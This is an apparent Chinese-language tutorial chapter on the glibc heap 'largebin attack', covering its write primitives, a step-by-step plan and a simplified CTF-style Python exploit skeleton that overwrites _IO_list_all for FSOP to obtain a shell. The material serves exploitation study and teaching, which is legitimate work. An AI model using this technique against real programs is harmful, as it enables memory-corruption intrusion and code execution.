# 第 8 章 largebin attack 深入

> largebin attack 是修改 `_IO_list_all`、`global_max_fast` 等全局变量的核心手段。这一章我们把它的源码机制和实战构造讲透。

---

## 8.1 largebin 的结构回顾

largebin 中的 chunk 除了 fd/bk（双向链表），还有 fd_nextsize/bk_nextsize：

```text
按大小排序的 largebin 链表：
   chunk A (size 0x500)  ←→  chunk B (size 0x420)  ←→  chunk C (size 0x420)

fd_nextsize/bk_nextsize 跳过相同大小的 chunk，连到下一个不同大小的 chunk：
   A.fd_nextsize = B
   B.bk_nextsize = A
   B.fd_nextsize = C（如果 C size 不同）
```

## 8.2 largebin attack 的两个写入点

在 `_int_malloc` 把 unsorted bin 的 chunk 归类到 largebin 时：

```c
// glibc 2.31 的源码片段
if (fwd != bck) {
    // 找到插入位置
    ...
    if (size < chunksize(victim)) {
        // 插入到不同大小的位置
        fwd = victim->fd_nextsize;
        bck = victim;
        
        // ============ 写入点 1 ============
        // 修改 bk_nextsize 的 fd_nextsize
        victim->fd_nextsize->bk_nextsize->fd_nextsize = ...  // 复杂
        
        // ============ 写入点 2 ============
        bck->fd = victim;   // 往 *(bck + 0x10) 写 victim
    }
}
```

实际的 largebin attack 利用的是：

```c
// 2.31 的 largebin attack 核心
fwd->bk_nextsize->fd_nextsize = victim;   // 写入点 A
bck->fd = victim;                          // 写入点 B
```

### 8.2.1 写入点 A：fd_nextsize 链

如果控制 `fwd->bk_nextsize = target - 0x18`，则：

```c
fwd->bk_nextsize->fd_nextsize = victim
→ *(target - 0x18 + 0x18) = victim
→ *target = victim（堆地址）
```

### 8.2.2 写入点 B：双向链表

如果控制 `bck = target - 0x10`，则：

```c
bck->fd = victim
→ *(target - 0x10 + 0x10) = victim
→ *target = victim（堆地址）
```

---

## 8.3 实战：用 largebin attack 修改 _IO_list_all

### 条件

1. 能控制两个 largebin chunk 的 fd/bk/fd_nextsize/bk_nextsize（通过 UAF）
2. 能触发 malloc 使 unsorted bin 的 chunk 归类到 largebin

### 步骤

```text
1. 分配两个大 chunk（> 0x420）A 和 B
2. free A、B → 进入 unsorted bin
3. malloc 一个更大的 chunk，让 A、B 被归类到 largebin
4. 通过 UAF 修改 B 的 bk = _IO_list_all - 0x10
5. 再 free 一个 chunk C，让它进入 unsorted bin
6. malloc 使 C 被归类到 largebin → 触发写入点
7. _IO_list_all 被改为 C 的地址（堆地址）
8. 在 C 的位置布置伪造的 FILE 结构
9. exit → FSOP → getshell
```

### 关键代码

```python
# 假设已泄露 libc 和 heap 地址
IO_list_all = libc.sym['_IO_list_all']

# 1. 布置 chunk A、B 进 largebin
add(0, 0x500, b'A')   # chunk A
add(1, 0x500, b'B')   # chunk B
delete(0)
delete(1)
add(2, 0x600, b'C')   # 触发 A、B 归类到 largebin

# 2. UAF 修改 B 的 bk 指向 _IO_list_all - 0x10
edit(1, p64(IO_list_all - 0x10))

# 3. 触发 largebin attack
delete(2)   # C 进 unsorted bin
add(3, 0x600, b'D')   # C 归类到 largebin，触发 bck->fd = victim
# 现在 _IO_list_all 被改成 C 的地址

# 4. 在 C 的位置写伪造 FILE（需要在步骤 2 前布置好）
```

> ⚠️ **注意**：largebin attack 的构造高度依赖堆布局和 glibc 版本。上面的代码是简化版，实际需要根据具体程序调整。建议用 gdb 单步跟踪，观察 `_IO_list_all` 的变化。

---

## 8.4 glibc 2.35 的 largebin attack

glibc 2.35 对 largebin 的插入逻辑做了调整，部分检查更严格：

```c
// 2.35 中的检查
if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd)) {
    malloc_printerr ("malloc(): largebin double linked list corrupted (nextsize)");
}
```

绕过方法：同时伪造 `fd_nextsize` 和 `bk_nextsize`，让检查通过。这需要更精细的堆布局。

---

## 8.5 小结

这一章我们深入学习了 largebin attack：

- **两个写入点**：`fd_nextsize` 链和双向链表的 `bck->fd`
- **效果**：往任意地址写入一个堆地址（被插入 chunk 的地址）
- **应用**：修改 `_IO_list_all`（FSOP）、`global_max_fast` 等
- **版本差异**：2.35 的检查更严格，需要伪造完整的链表结构

下一章我们讲堆布局自动化——用脚本规划 malloc/free 序列。

---

**下一章**：[堆布局自动化技巧](./ch09-堆布局自动化.md)
